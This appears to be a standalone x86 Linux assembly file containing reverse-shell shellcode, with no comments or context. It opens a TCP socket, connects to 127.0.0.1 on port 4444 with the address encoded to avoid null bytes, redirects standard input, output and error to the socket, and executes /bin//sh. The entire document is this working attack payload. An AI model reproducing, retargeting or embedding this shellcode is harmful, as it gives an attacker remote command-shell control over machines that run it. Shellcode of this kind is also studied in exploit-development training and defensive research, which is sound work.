global _start
section .text
_start:
        xor eax, eax
        mov al, 0x66
        xor ebx, ebx
        mov bl, 0x1
        xor ecx, ecx
        push ecx
        push 0x1
        push 0x2
        mov ecx, esp
        int 0x80
        xor edx, edx
        mov edx, eax
        mov al, 0x66
        mov bl, 0x3
        xor ecx, ecx
        push 0x02010180
	      sub dword[esp], 0x01010101         
        push word 0x5C11
        push word 0x2
        mov esi, esp
        push 0x10
        push esi
        push edx
        mov ecx, esp
        int 0x80
        mov al, 0x3f
        mov ebx, edx
        xor ecx, ecx
        int 0x80
        mov al, 0x3f
        mov cl, 0x1
        int 0x80
        mov al, 0x3f
        mov cl, 0x2
        int 0x80
        mov al, 0xb
        xor ebx, ebx
        push ebx
        push 0x68732f6e
        push 0x69622f2f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80
